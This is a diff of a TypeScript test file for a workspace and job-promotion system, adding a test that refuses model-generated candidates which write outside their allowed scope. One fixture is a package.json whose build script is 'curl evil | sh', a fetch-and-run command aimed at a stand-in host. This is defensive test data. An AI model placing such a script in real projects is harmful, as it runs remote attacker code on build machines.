@@ -11,14 +11,24 @@
  */
 import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
 import { execFile } from 'node:child_process';
-import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
+import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
 import { existsSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { dirname, join } from 'node:path';
 import { promisify } from 'node:util';
 import { Collection } from 'mongodb';
 import { StateStore } from '@statxai/state';
-import { ArtifactRegistry, ProjectWorkspace, contentHash, scaffoldTemplatePaths } from '@statxai/workspace';
+import { ArtifactRegistry, ProjectWorkspace, WriteOutsideModelScope, contentHash, scaffoldTemplatePaths } from '@statxai/workspace';
+
+/**
+ * Someone else's canonical change — not model output, so written straight to
+ * disk rather than through the model-candidate write boundary.
+ */
+async function foreignWrite(ws: ProjectWorkspace, path: string, contents: string): Promise<void> {
+  const target = join(ws.siteRoot, path);
+  await mkdir(dirname(target), { recursive: true });
+  await writeFile(target, contents, 'utf8');
+}
 import { JobEngine, PromotionFenceConflict, jobOutputNamespace } from '@statxai/job-engine';
 import type { ArtifactRef, JobSpec } from '@statxai/contracts';
 import type { BuildCandidate } from '../src/phases/build.js';
@@ -424,12 +434,41 @@ describe('file path safety', () => {
     await engine.submitForValidation(jobId, 'promotion-fixture-worker', claimed!.attempt, { outputs: [ref] });
     await engine.accept(jobId, 'harness:validator');
 
-    await expect(promoteAcceptedFrontendBackendCandidate(jobId, promotionDeps())).rejects.toThrow(/workspace/i);
+    await expect(promoteAcceptedFrontendBackendCandidate(jobId, promotionDeps())).rejects.toBeInstanceOf(WriteOutsideModelScope);
 
     const ws = await canonicalWorkspace(projectId);
     expect(await ws.currentCommit()).toBeNull();
-    const record = await store.promotions.findOne({ jobId });
-    expect(record?.status).not.toBe('committed');
+    // Refused before any promotion authority was taken: no receipt, no fence.
+    expect(await store.promotions.findOne({ jobId })).toBeNull();
+    expect((await store.jobs.findOne({ _id: jobId }))?.promotionFence ?? null).toBeNull();
+  });
+});
+
+describe('model-writable candidate boundary', () => {
+  it('refuses an accepted candidate that would replace package.json, before any fence, receipt or canonical write', async () => {
+    const projectId = 'proj_promote_forbidden_manifest';
+    const jobId = 'job_promote_forbidden_manifest';
+    await engine.enqueue({ spec: jobSpec(projectId, jobId), origin: { kind: 'plan' } });
+    const claimed = await engine.claim('promotion-fixture-worker', 'terra', { roles: ['frontend_backend'], leaseMs: LEASE_MS });
+    const forbidden: BuildCandidate = {
+      routeDecisions: [],
+      files: [
+        { path: 'app/page.tsx', contents: 'fine' },
+        { path: 'package.json', contents: '{"scripts":{"build":"curl evil | sh"}}' },
+      ],
+    };
+    const ref = await registry.put(projectId, frontendBackendCandidateName(jobId, claimed!.attempt), forbidden);
+    await registry.accept(projectId, ref);
+    await engine.submitForValidation(jobId, 'promotion-fixture-worker', claimed!.attempt, { outputs: [ref] });
+    await engine.accept(jobId, 'harness:validator');
+
+    await expect(promoteAcceptedFrontendBackendCandidate(jobId, promotionDeps())).rejects.toBeInstanceOf(WriteOutsideModelScope);
+
+    const ws = await canonicalWorkspace(projectId);
+    expect(await ws.currentCommit()).toBeNull();
+    expect(existsSync(join(ws.siteRoot, 'app/page.tsx'))).toBe(false);
+    expect(await store.promotions.findOne({ jobId })).toBeNull();
+    expect((await store.jobs.findOne({ _id: jobId }))?.promotionFence ?? null).toBeNull();
   });
 });
 
@@ -490,7 +529,7 @@ describe('unrelated dirty canonical file blocks promotion', () => {
     const ws = await canonicalWorkspace(projectId);
     const { scaffoldSite } = await import('@statxai/workspace');
     await scaffoldSite(ws.siteRoot);
-    await ws.writeSiteFiles([{ path: 'unrelated-manual-edit.txt', contents: 'not part of any candidate' }]);
+    await foreignWrite(ws, 'unrelated-manual-edit.txt', 'not part of any candidate');
 
     await expect(promoteAcceptedFrontendBackendCandidate(jobId, promotionDeps())).rejects.toBeInstanceOf(
       PromotionWorkingTreeDirty,
@@ -606,7 +645,7 @@ describe('prepared base commit conflict', () => {
     // Canonical HEAD legitimately advances to B, with no promotion marker.
     const { scaffoldSite } = await import('@statxai/workspace');
     await scaffoldSite(ws.siteRoot);
-    await ws.writeSiteFiles([{ path: 'unrelated.txt', contents: 'unrelated canonical change' }]);
+    await foreignWrite(ws, 'unrelated.txt', 'unrelated canonical change');
     const headB = await ws.commit('unrelated canonical work');
     expect(headB).not.toBeNull();
 
@@ -642,7 +681,7 @@ describe('promotion commit may become an ancestor', () => {
     expect(commitC).not.toBeNull();
 
     // A later, legitimate canonical commit D lands on top of C.
-    await ws.writeSiteFiles([{ path: 'later.txt', contents: 'later canonical work' }]);
+    await foreignWrite(ws, 'later.txt', 'later canonical work');
     const commitD = await ws.commit('later canonical work, on top of the promotion');
     expect(commitD).not.toBeNull();
     expect(commitD).not.toBe(commitC);
@@ -871,9 +910,9 @@ describe('exact Git marker lookup', () => {
     const ws = await canonicalWorkspace(projectId);
     const { scaffoldSite } = await import('@statxai/workspace');
     await scaffoldSite(ws.siteRoot);
-    await ws.writeSiteFiles([{ path: 'decoy.txt', contents: 'x' }]);
+    await foreignWrite(ws, 'decoy.txt', 'x');
     await ws.commit('Statx-Promotion-Id-ish: not-a-real-marker-line');
-    await ws.writeSiteFiles([{ path: 'decoy2.txt', contents: 'y' }]);
+    await foreignWrite(ws, 'decoy2.txt', 'y');
     await ws.commit('mentions Statx-Promotion-Id: fakeid123 inline, not as its own line');
 
     const result = await promoteAcceptedFrontendBackendCandidate(jobId, promotionDeps());
@@ -1012,7 +1051,7 @@ describe('Phase 5n — the promotion fence', () => {
     // An unrelated canonical write lands on this project's lineage before
     // the retry — HEAD is no longer what the fence itself recorded.
     const ws = await canonicalWorkspace(projectId);
-    await ws.writeSiteFiles([{ path: 'unrelated.txt', contents: 'someone else\'s canonical write' }]);
+    await foreignWrite(ws, 'unrelated.txt', 'someone else\'s canonical write');
     const unrelatedCommit = await ws.commit('an unrelated canonical write');
     expect(unrelatedCommit).not.toBeNull();
     expect(await ws.currentCommit()).toBe(unrelatedCommit);
